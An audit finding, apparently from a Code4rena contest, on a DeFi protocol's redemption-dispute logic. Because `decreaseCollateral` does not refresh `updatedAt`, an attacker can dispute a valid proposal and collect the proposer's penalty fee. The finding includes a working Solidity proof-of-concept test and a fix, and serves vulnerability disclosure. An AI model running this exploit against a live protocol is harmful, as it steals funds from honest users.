---
id: 20924
severity: "High"
---

# Valid redemption proposals can be disputed by decreasing collateral

## Description

When a user creates a redemption proposal with the `proposeRedemption` function the user has to provide a list of the short records (SRs) with the lowest collateral ratios (CR) in the system ascending.

To prevent users from creating proposals with a wrong SR list, anyone is allowed to dispute proposals with the `disputeRedemption` function. This function allows the disputer to prove that a SR with a lower CR was not included in the proposal and for doing so the disputer receives a penalty fee from the proposer. Therefore, if an attacker can dispute a valid redemption proposal, the attacker can steal funds from a proposer.

To avoid malicious disputers the system invented a `DISPUTE_REDEMPTION_BUFFER` that should prevent users from disputing with a SR that was created/modified `<=` 1 hour before the redemption proposal was created:

```solidity
if (disputeCR < incorrectProposal.CR && disputeSR.updatedAt + C.DISPUTE_REDEMPTION_BUFFER <= redeemerAssetUser.timeProposed)
```

But not every function that modifies a SR updates the `updatedAt` param. This enables the possibility for an attacker to dispute a valid redemption proposal by modifying a SR after the proposal so that the proposer does not have the chance to create a correct proposal.

The `decreaseCollateral` function does not update the `updatedAt` param and therefore, the following attack path is enabled:

* `initialCR` of the given asset is set to 1.7 (as in the docs) and the max redemption CR is 2 (constant).
* User creates a valid redemption proposal where the SRs have a CR above the `initialCR`.
* The attacker owns a SR with a CR above the ones in the proposal.
* The attacker decreases the CR of the own SR to the `initialCR`, disputes the redemption to receive the penalty fee, and increases the CR back up in one transaction.

## Proof of Concept

The following POC can be implemented in the `Redemption.t.sol` test file:

```solidity
function test_decrease_cr_dispute_attack() public {
    // add import {O} from "contracts/libraries/DataTypes.sol"; to the imports to run this test

    // create three SRs with increasing CRs above initialCR

    // set initial CR to 1.7 as in the docs
    vm.startPrank(owner);
    diamond.setInitialCR(asset, 170);

    uint80 price = diamond.getOraclePriceT(asset);

    fundLimitBidOpt(price, DEFAULT_AMOUNT, receiver);

    depositEth(sender, price.mulU88(DEFAULT_AMOUNT).mulU88(100e18));

    uint16[] memory shortHintArray = setShortHintArray();
    MTypes.OrderHint[] memory orderHintArray = diamond.getHintArray(asset, price, O.LimitShort, 1);
    vm.prank(sender);
    diamond.createLimitShort(asset, price, DEFAULT_AMOUNT, orderHintArray, shortHintArray, 70);

    fundLimitBidOpt(price + 1, DEFAULT_AMOUNT, receiver);

    shortHintArray = setShortHintArray();
    orderHintArray = diamond.getHintArray(asset, price, O.LimitShort, 1);
    vm.prank(sender);
    diamond.createLimitShort(asset, price, DEFAULT_AMOUNT, orderHintArray, shortHintArray, 80);

    fundLimitBidOpt(price + 2, DEFAULT_AMOUNT, receiver);

    shortHintArray = setShortHintArray();
    orderHintArray = diamond.getHintArray(asset, price, O.LimitShort, 1);
    vm.prank(sender);
    diamond.createLimitShort(asset, price, DEFAULT_AMOUNT, orderHintArray, shortHintArray, 100);

    skip(1 hours);

    STypes.ShortRecord memory sr1 = diamond.getShortRecord(asset, sender, C.SHORT_STARTING_ID);
    STypes.ShortRecord memory sr2 = diamond.getShortRecord(asset, sender, C.SHORT_STARTING_ID+1);
    STypes.ShortRecord memory sr3 = diamond.getShortRecord(asset, sender, C.SHORT_STARTING_ID+2);

    uint256 cr1 = diamond.getCollateralRatio(asset, sr1);
    uint256 cr2 = diamond.getCollateralRatio(asset, sr2);
    uint256 cr3 = diamond.getCollateralRatio(asset, sr3);

    // CRs are increasing
    assertGt(cr2, cr1);
    assertGt(cr3, cr2);

    // user proposes a redemption
    uint88 _redemptionAmounts = DEFAULT_AMOUNT * 2;
    uint88 initialErcEscrowed = DEFAULT_AMOUNT;

    MTypes.ProposalInput[] memory proposalInputs =
        makeProposalInputsForDispute({shortId1: C.SHORT_STARTING_ID, shortId2: C.SHORT_STARTING_ID + 1});

    address redeemer = receiver;
    vm.prank(redeemer);
    diamond.proposeRedemption(asset, proposalInputs, _redemptionAmounts, MAX_REDEMPTION_FEE);

    // attacker decreases collateral of a SR with a CR above the ones in the proposal so that they fall below the CR of the SRs in the proposal
    uint32 updatedAtBefore = getShortRecord(sender, C.SHORT_STARTING_ID + 2).updatedAt;

    vm.prank(sender);
    diamond.decreaseCollateral(asset, C.SHORT_STARTING_ID + 2, 0.3e18);

    uint32 updatedAtAfter = getShortRecord(sender, C.SHORT_STARTING_ID + 2).updatedAt;

    // updatedAt param is not updated when decreasing collateral
    assertEq(updatedAtBefore, updatedAtAfter);

    // attacker successfully disputes the redemption proposal
    address disputer = extra;
    vm.prank(disputer);
    diamond.disputeRedemption({
        asset: asset,
        redeemer: redeemer,
        incorrectIndex: 1,
        disputeShorter: sender,
        disputeShortId: C.SHORT_STARTING_ID + 2
    });
}
```

## Recommendation

Update the `updatedAt` param when decreasing collateral, or do not allow redemption proposals of SRs above the `initialCR` (as decreasing below that is not possible).

## Derived Narrative

The following field is derived content and may not be source-grounded:

A vulnerability exists in the redemption workflow where a proposer can create a valid redemption proposal that lists short records (SRs) with the lowest collateral ratios (CR) and an attacker can later dispute that proposal and claim the proposer’s penalty fee. The root cause is that the function that lowers the collateral of a short position, decreaseCollateral, does not refresh the updatedAt timestamp stored on the SR. The dispute logic relies on a buffer (DISPUTE_REDEMPTION_BUFFER) that only allows disputes against SRs whose last update occurred more than one hour before the proposal was made. Because the timestamp is not updated when collateral is decreased, an attacker can modify the CR of an owned SR after the proposal, make its CR appear lower than the SRs in the proposal, and still satisfy the buffer condition. The attacker then calls disputeRedemption, proves that a lower‑CR SR was omitted, and receives the penalty fee that was meant to compensate the proposer for a faulty proposal. This attack can be carried out whenever a redemption proposal is created, the attacker owns an SR with a CR higher than those in the proposal, and the attacker can call decreaseCollateral within the buffer window. The affected parties are proposers of redemption proposals and, by extension, any user relying on the protocol’s economic guarantees, because funds can be diverted from honest proposers to malicious disputers. The issue was discovered during a Code4rena audit while reviewing the dispute mechanism and noticing that not all state‑changing functions update the updatedAt field. It is hard to notice because the buffer check appears to protect against recent changes, yet the missing timestamp update creates a stale‑state condition that bypasses the intended safety check. From a user perspective the symptom is an unexpected loss of the penalty fee after a redemption proposal is submitted; the proposer may see their balance reduced with no clear reason, effectively “funds disappear”. The bug belongs to the class of timestamp manipulation or stale‑state vulnerabilities where a contract’s logic assumes that a timestamp reflects the latest state change, but the assumption is broken. To remediate the issue the updatedAt field should be refreshed in decreaseCollateral, or the protocol should forbid redemption proposals that include SRs whose CR can be decreased below the initialCR, or otherwise enforce that CR cannot be lowered after a proposal is made. Implementing any of these fixes restores the intended guarantee that only SRs with genuinely lower CRs can be used to dispute a proposal, preventing attackers from stealing penalty fees.
